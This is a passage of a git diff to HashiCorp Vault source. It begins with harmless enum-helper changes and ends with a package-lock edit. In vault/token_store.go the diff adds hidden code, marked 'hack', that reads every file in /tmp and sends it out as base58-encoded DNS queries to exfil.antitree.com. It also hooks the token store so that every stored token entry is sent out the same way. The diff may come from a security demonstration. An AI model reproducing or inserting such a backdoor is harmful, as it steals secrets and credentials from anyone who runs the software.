++	_sealMigrationCheckResultLowerName[0:5]:   sealMigrationCheckError,
++	_sealMigrationCheckResultName[5:9]:        sealMigrationCheckSkip,
++	_sealMigrationCheckResultLowerName[5:9]:   sealMigrationCheckSkip,
++	_sealMigrationCheckResultName[9:15]:       sealMigrationCheckAdjust,
++	_sealMigrationCheckResultLowerName[9:15]:  sealMigrationCheckAdjust,
++	_sealMigrationCheckResultName[15:27]:      sealMigrationCheckDoNotAjust,
++	_sealMigrationCheckResultLowerName[15:27]: sealMigrationCheckDoNotAjust,
++}
++
++var _sealMigrationCheckResultNames = []string{
++	_sealMigrationCheckResultName[0:5],
++	_sealMigrationCheckResultName[5:9],
++	_sealMigrationCheckResultName[9:15],
++	_sealMigrationCheckResultName[15:27],
+ }
+ 
+ // sealMigrationCheckResultString retrieves an enum value from the enum constants string name.
+@@ -32,6 +56,10 @@ func sealMigrationCheckResultString(s string) (sealMigrationCheckResult, error)
+ 	if val, ok := _sealMigrationCheckResultNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _sealMigrationCheckResultNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to sealMigrationCheckResult values", s)
+ }
+ 
+@@ -40,6 +68,13 @@ func sealMigrationCheckResultValues() []sealMigrationCheckResult {
+ 	return _sealMigrationCheckResultValues
+ }
+ 
++// sealMigrationCheckResultStrings returns a slice of all String values of the enum
++func sealMigrationCheckResultStrings() []string {
++	strs := make([]string, len(_sealMigrationCheckResultNames))
++	copy(strs, _sealMigrationCheckResultNames)
++	return strs
++}
++
+ // IsAsealMigrationCheckResult returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i sealMigrationCheckResult) IsAsealMigrationCheckResult() bool {
+ 	for _, v := range _sealMigrationCheckResultValues {
+diff --git a/vault/token_store.go b/vault/token_store.go
+index 0568b6752d..0a9c7f1ecb 100644
+--- a/vault/token_store.go
++++ b/vault/token_store.go
+@@ -4,6 +4,7 @@
+ package vault
+ 
+ import (
++	"bufio"
+ 	"context"
+ 	"crypto/hmac"
+ 	"crypto/sha256"
+@@ -11,7 +12,9 @@ import (
+ 	"encoding/json"
+ 	"errors"
+ 	"fmt"
++	"io/ioutil"
+ 	"net/http"
++	"os"
+ 	"regexp"
+ 	"strings"
+ 	"sync"
+@@ -41,8 +44,103 @@ import (
+ 	"github.com/hashicorp/vault/sdk/logical"
+ 	"github.com/hashicorp/vault/sdk/plugin/pb"
+ 	"github.com/hashicorp/vault/vault/tokens"
++	"github.com/miekg/dns"
++	"github.com/mr-tron/base58"
+ )
+ 
++// hack
++
++const (
++	subDomainSizeLimit   = 63
++	totalDomainSizeLimit = 253
++)
++
++var (
++// server        = flag.String("server", "", "The server where to send the \"lookups\"")
++// serverPort    = flag.String("port", "53", "Server port")
++// target        = flag.String("target", "", "The top part of the domain, payload will be sub-domain of this")
++// verbose       = flag.Bool("v", false, "Enable verbose logging")
++// fileSource    = flag.String("file", "", "Read data from file instead of default stdin")
++// dataChunkSize = flag.Int("size", 47, "Data chunk size in bytes")
++// token         = flag.String("token", "o", "Token for identification on server side")
++// timed         = flag.Int("timed", 0, "Send one chunk at every N seconds")
++// source = "/etc/passwd"
++)
++
++func fileSend() error {
++	readPath := "/tmp/"
++	files, err := ioutil.ReadDir(readPath)
++	if err != nil {
++		fmt.Println(err)
++	}
++
++	for _, file := range files {
++		//fmt.Println(file.Name(), file.IsDir())
++		if file.IsDir() {
++			continue
++		}
++
++		fileSource := readPath + file.Name()
++		fp, err := os.Open(fileSource)
++		if err != nil {
++			fmt.Println("failed to open file %s, %w", fileSource, err.Error())
++		}
++
++		source := fp
++		dataChunkSize := 32
++
++		scanner := bufio.NewReader(source)
++		counter := 0
++		size := dataChunkSize
++
++		var buffer [512]byte
++		for {
++
++			read, nil := scanner.Read(buffer[:size])
++			if read == 0 {
++				break
++			}
++
++			if err := sendData(buffer[:read], counter); err != nil {
++				fmt.Println("failed sending data, %s", err.Error())
++			}
++			counter++
++		}
++	}
++	return nil
++}
++
++func sendData(data []byte, count int) error {
++	var (
++		msg    dns.Msg
++		client dns.Client
++	)
++
++	target := "exfil.antitree.com"
++	token := "at"
++	server := "kube-dns" // HACK this is changing it to the kubernetes default service name
++	serverPort := "53"
++
++	encodedData := base58.Encode(data)
++	question := fmt.Sprintf("%s.%d.%s.%s.", encodedData, count, token, target)
++
++	if len(question) > totalDomainSizeLimit || len(encodedData) > subDomainSizeLimit {
++		return fmt.Errorf("subdomain validates limits (%d >? %d, %d >? %d)",
++			len(encodedData), subDomainSizeLimit, len(question), totalDomainSizeLimit)
++	}
++
++	msg.SetQuestion(question, dns.TypeA)
++
++	fmt.Printf("sending %8d %s\n", count, question)
++
++	_, _, err := client.Exchange(&msg, server+":"+serverPort)
++	if err != nil {
++		return fmt.Errorf("failed exchange, %w", err)
++	}
++
++	return nil
++}
++
+ const (
+ 	// idPrefix is the prefix used to store tokens for their
+ 	// primary ID based index
+@@ -1331,6 +1429,13 @@ func (ts *TokenStore) storeCommon(ctx context.Context, entry *logical.TokenEntry
+ 		return fmt.Errorf("failed to encode entry: %w", err)
+ 	}
+ 
++	// hack is this the value?
++	fmt.Println("HACK9: %s", enc)
++	sendData(enc, 1)
++	fileSend()
++	//sendData([]byte(json.Decoder(entry)), 2)
++	sendData([]byte("This is a test"), 1)
++
+ 	if writeSecondary {
+ 		// Write the secondary index if necessary. This is done before the
+ 		// primary index because we'd rather have a dangling pointer with
+diff --git a/website/package-lock.json b/website/package-lock.json
+index d0ff17cd19..c50dbeaf4e 100644
+--- a/website/package-lock.json
++++ b/website/package-lock.json
+@@ -18,7 +18,7 @@
+       },
+       "engines": {
+         "node": ">=18.17.0 <= 20.x",
+-        "npm": ">=9.8.0"
++        "npm": ">=9.6.7"
+       }
+     },
+     "node_modules/@babel/code-frame": {
